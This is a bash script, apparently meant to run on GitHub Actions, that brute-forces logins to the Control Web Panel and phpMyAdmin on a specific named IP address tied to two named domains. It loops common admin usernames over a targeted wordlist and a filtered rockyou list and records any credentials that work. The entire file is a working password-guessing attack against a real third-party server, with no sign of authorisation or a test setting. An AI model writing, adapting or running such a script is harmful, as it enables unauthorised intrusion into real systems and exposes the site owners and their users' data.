#!/bin/bash
# Brute Force Script for CWP + phpMyAdmin
# Target: 103.138.96.183 (enikah.in / abdemustafa.org)
# Designed for GitHub Actions (6hr limit)

TARGET_IP="103.138.96.183"
CWP_PORT=2083
PMA_PORT=2031
RESULTS_FILE="results.txt"
LOG_FILE="bruteforce.log"

> "$RESULTS_FILE"
> "$LOG_FILE"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

check_cwp() {
    local user=$1
    local pass=$2
    local resp
    resp=$(curl -sk "https://${TARGET_IP}:${CWP_PORT}/login/index.php?acc=validate" \
        -d "username=${user}&password=${pass}&commit=Login" \
        --connect-timeout 5 --max-time 10 2>/dev/null)
    if echo "$resp" | grep -qi "success\|dashboard\|redirect\|welcome"; then
        return 0
    fi
    return 1
}

check_pma() {
    local user=$1
    local pass=$2
    local resp
    resp=$(curl -sk "https://${TARGET_IP}:${PMA_PORT}/pma/index.php" \
        -d "pma_username=${user}&pma_password=${pass}&server=1&lang=en" \
        --connect-timeout 5 --max-time 10 2>/dev/null)
    if echo "$resp" | grep -qi "logout\|databases\|Browse\|logged_in"; then
        return 0
    fi
    return 1
}

USERS=("root" "admin" "administrator" "webmaster" "cwp" "centos" "panel" "server")

log "=== Brute Force Started ==="
log "Target: ${TARGET_IP}"

if [ "$PHASE" = "all" ] || [ "$PHASE" = "targeted" ] || [ -z "$PHASE" ]; then
    if [ -f targeted.txt ]; then
        COUNT=$(wc -l < targeted.txt)
        log "=== Phase 1: Targeted Wordlist (${COUNT} passwords) ==="
        while IFS= read -r pass; do
            for user in "${USERS[@]}"; do
                if check_cwp "$user" "$pass"; then
                    log "*** CWP HIT: ${user}:${pass} ***"
                    echo "CWP HIT: ${user}:${pass}" >> "$RESULTS_FILE"
                fi
                if check_pma "$user" "$pass"; then
                    log "*** phpMyAdmin HIT: ${user}:${pass} ***"
                    echo "phpMyAdmin HIT: ${user}:${pass}" >> "$RESULTS_FILE"
                fi
                sleep 0.2
            done
        done < targeted.txt
    else
        log "targeted.txt not found, skipping Phase 1"
    fi
fi

if [ "$PHASE" = "all" ] || [ "$PHASE" = "rockyou" ]; then
    ROCKYOU=""
    if [ -f rockyou_filtered.txt ]; then
        ROCKYOU="rockyou_filtered.txt"
    elif [ -f /usr/share/wordlists/rockyou.txt ]; then
        ROCKYOU="/usr/share/wordlists/rockyou.txt"
    fi

    if [ -n "$ROCKYOU" ]; then
        log "=== Phase 2: Filtering rockyou ==="
        grep -E '^[A-Za-z0-9!@#$%^&*]{8,16}$' "$ROCKYOU" | head -50000 > /tmp/rockyou_filtered.txt
        FILTERED_COUNT=$(wc -l < /tmp/rockyou_filtered.txt)
        log "Filtered: ${FILTERED_COUNT} passwords"
        
        while IFS= read -r pass; do
            for user in "${USERS[@]}"; do
                if check_cwp "$user" "$pass"; then
                    log "*** CWP HIT: ${user}:${pass} ***"
                    echo "CWP HIT: ${user}:${pass}" >> "$RESULTS_FILE"
                fi
                if check_pma "$user" "$pass"; then
                    log "*** phpMyAdmin HIT: ${user}:${pass} ***"
                    echo "phpMyAdmin HIT: ${user}:${pass}" >> "$RESULTS_FILE"
                fi
                sleep 0.2
            done
        done < /tmp/rockyou_filtered.txt
    else
        log "No rockyou wordlist found, skipping Phase 2"
    fi
fi

log "=== Brute Force Complete ==="
HITS=$(wc -l < "$RESULTS_FILE" 2>/dev/null || echo 0)
log "Results: ${HITS} lines"
cat "$RESULTS_FILE" 2>/dev/null
